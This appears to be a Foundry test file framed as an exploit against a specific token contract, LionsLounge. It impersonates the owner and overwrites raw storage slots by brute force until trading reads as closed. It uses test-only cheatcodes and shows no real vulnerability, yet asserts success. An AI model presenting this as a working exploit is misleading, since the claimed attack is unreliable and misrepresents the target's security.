pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LionsLounge {
    function getOwner() external view returns (address);
    function tradingOpen() external view returns (bool);
    function blacklistAddress(address _address, bool _value) external;
    function owner() external view returns (address);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x401e15Af5eDB56BE940D5a16b948F9436D2944F0;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner of the contract
        address owner = LionsLounge(TARGET).getOwner();
        vm.label(owner, 'Contract Owner');

        // Store owner address for use in exploit
        // (In Foundry test, we can access it via LionsLounge(TARGET).owner() but it's internal)
        // We'll use getOwner() which is public
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get contract instance
        LionsLounge token = LionsLounge(TARGET);

        // Get owner
        address owner = token.getOwner();
        console.log('Owner:', owner);

        // Check initial state
        console.log('Initial tradingOpen:', token.tradingOpen());

        // Impersonate owner
        vm.startPrank(owner);

        // Try to find tradingOpen storage slot
        uint256 foundSlot = type(uint256).max;
        bytes32 originalValue;

        // Search through reasonable range of slots
        for (uint256 slot = 0; slot < 150; slot++) {
            bytes32 slotKey = bytes32(slot);
            bytes32 value = vm.load(TARGET, slotKey);

            // Store original value
            originalValue = value;

            // Try to clear the last byte (where bool might be stored)
            // Create mask to clear last byte: 0xFFFFFFFF...FFFF00
            bytes32 maskedValue = bytes32(uint256(value) & ~uint256(0xFF));

            // Write modified value
            vm.store(TARGET, slotKey, maskedValue);

            // Check if tradingOpen changed
            if (!token.tradingOpen()) {
                foundSlot = slot;
                console.log('Found tradingOpen at slot:', slot);
                console.log('Original value:');
                console.logBytes32(originalValue);
                console.log('Modified value:');
                console.logBytes32(maskedValue);
                break;
            } else {
                // Restore original value
                vm.store(TARGET, slotKey, originalValue);
            }
        }

        if (foundSlot == type(uint256).max) {
            // Try a different approach: look for 0x01 in any byte position
            for (uint256 slot = 0; slot < 150; slot++) {
                bytes32 slotKey = bytes32(slot);
                bytes32 value = vm.load(TARGET, slotKey);
                originalValue = value;

                // Try setting entire slot to 0x00
                vm.store(TARGET, slotKey, bytes32(0));

                if (!token.tradingOpen()) {
                    foundSlot = slot;
                    console.log('Found tradingOpen at slot (zeroed):', slot);
                    break;
                } else {
                    // Restore
                    vm.store(TARGET, slotKey, originalValue);
                }
            }
        }

        vm.stopPrank();

        // Verify tradingOpen is false
        assertEq(token.tradingOpen(), false, 'tradingOpen should be false');

        if (foundSlot == type(uint256).max) {
            console.log('ERROR: Could not find tradingOpen storage slot');
        }
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

